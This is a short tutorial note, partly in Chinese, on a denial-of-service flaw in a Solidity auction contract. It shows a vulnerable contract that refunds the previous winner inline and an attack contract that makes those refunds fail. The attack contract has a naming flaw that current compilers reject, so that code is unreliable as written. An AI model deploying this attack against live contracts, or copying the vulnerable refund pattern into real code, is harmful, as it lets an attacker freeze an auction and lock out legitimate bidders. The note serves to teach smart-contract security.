## Dos Vulnerability
* https://www.bilibili.com/video/BV1w84y167td/?
  
* Bid Contract
```solidity
contract Auction{
  address public winner; //winner address
  uint256 public amount; // winner bid amount

  function bid() external payable{
    //bid amount must > zero
    require(msg.value > 0, "amount is not 0");
    //current bid amount must > last winner bid amount
    require(msg.value > amount, "amount is too small");
    //send last bid amount back to investor
    payable(winner).transfer(amount);
    winner = msg.sender; // update winner
    amount = msg.value; // update bid amount
  }
}
```
* 攻击思路
```
用恶意攻击合约向目标合约投标，下一个投标者出价更高的时候，会把上一个投标者的出价退回，
但是由于恶意攻击合约被设计成不接受退款，（没有定义receive函数或fallback函数）所以退款会失败，
导致目标合约的bid函数执行到payable(winner).transfer(amount);这一行的时候失败，
从而导致目标合约无法继续执行，攻击合约就可以永远占据目标合约的bid函数，从而导致目标合约无法正常使用。

```
* Attack Contract
```solidity
contract Attack{
    //deploy this contract with some ether
    constructor() payable{}

    //target is the address of Auction contract, amount is the bid amount
    function Attack(address target, uint256 amount) external payable{
        //build Auction contract instance
        Auction auction = Auction(payable(target));
        //call bid function
        auction.bid{value: amount}();
    }

}
```
* 其他类型的DoS漏洞
```
1.未设定gas费率的外部调用
2.依赖外部调用
3.owner错误操作
4.数组或mapping过长
5.逻辑设计错误
6.缺少依赖库
```
